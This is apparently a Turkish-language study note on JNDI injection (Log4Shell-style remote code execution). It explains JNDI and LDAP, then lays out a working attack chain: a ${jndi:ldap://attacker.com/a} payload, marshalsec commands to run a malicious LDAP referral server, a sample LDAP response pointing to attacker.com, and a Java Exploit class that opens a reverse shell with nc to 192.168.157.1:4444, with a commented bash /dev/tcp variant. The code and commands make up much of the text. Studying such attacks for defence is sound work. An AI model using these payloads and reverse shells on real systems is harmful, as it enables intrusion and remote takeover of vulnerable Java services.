# JNDI Injection (Log4Shell Tarzı RCE) 

# 📌 JNDI (Java Naming and Directory Interface) nedir?
Java'da nesneleri adlandırmak ve bunlara ağ üzerinden erişmek için kullanılan bir API'dir. Örnek protokoller:
- LDAP
- RMI
- DNS
- CORBA
# LDAP Nedir?
**LDAP**, “**Lightweight Directory Access Protocol**” (Hafif Dizin Erişim Protokolü) anlamına gelir.  
Bir tür **veri tabanı gibi çalışan dizin hizmetidir**, ama yapısı biraz farklıdır.
### LDAP Sunucusu Ne Yapar?

Bir **LDAP sunucusu**, organizasyon içindeki kullanıcılar, gruplar, bilgisayarlar, yazıcılar gibi **nesneleri** ve **ilişkilerini** hiyerarşik olarak saklar ve yönetir.

#### 🔧 Tipik Kullanım Alanları:
- Şirket içi **kullanıcı doğrulama sistemleri** (Single Sign-On)
- **Active Directory** gibi kurumsal servislerin temelidir
- E-posta sistemleri, VPN, intranet vs. kimlik doğrulamada
#### Saldırgan Tarafında LDAP Sunucusu Ne İşe Yarar?
Bir **kötü niyetli LDAP sunucusu**, aşağıdakileri yapar:
1. Saldırıya uğrayan uygulama, `${jndi:ldap://attacker.com/a}` gibi bir ifade loglarsa,
2. Uygulama LDAP sunucusuna bağlanır,
3. LDAP sunucusu "şu Java sınıfını şuradan indir" der,
4. Uygulama bu sınıfı indirip çalıştırır ⇒ **Remote Code Execution**

Marhsalsec ile LDAP sunucusu: 
```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit"
```

Loglanacak yerde eğer 
```bash
${jndi:ldap://attacker.com/a}
```
gibi bir payload görünürse 
Bu durumda Java uygulaması:
1. `attacker.com` adresine 389 (LDAP) portu üzerinden bağlanır
2. `a` adındaki **LDAP kaydını** ister
3. LDAP sunucusu buna `javaClassName`, `javaFactory`, `javaCodeBase` gibi alanlarla cevap verir
#### LDAP sunucusu :
```
dn: cn=a,dc=example,dc=com
objectClass: javaNamingReference
javaClassName: Exploit
javaFactory: Exploit
javaCodeBase: http://attacker.com/
```
gibi bir cevap dönebilir.

LDAP sunucusu seni `http.server` sunucuna yönlendirir ve buradan bir java classı çekerek çalıştırmasını sağlar.

```bash title:"#Exploit kısmı class ismini belirtir"
java -cp target/marshalsec-*.jar marshalsec.jndi.LDAPRefServer 
"http://{.class dosyanın bulunduğu sunucu ip si}/#Exploit"
```

```java title:"örnek reverse shell java kodu"
import java.io.IOException;
public class Exploit {
    static {
        try {
            // String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/localhost/4444 0>&1"};
            String[] cmd = {"/bin/sh", "-c", "nc 192.168.157.1 4444 -e /bin/sh"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
derleyip `Exploit.class` dosyası oluştur bu sayede bir RCE oluşur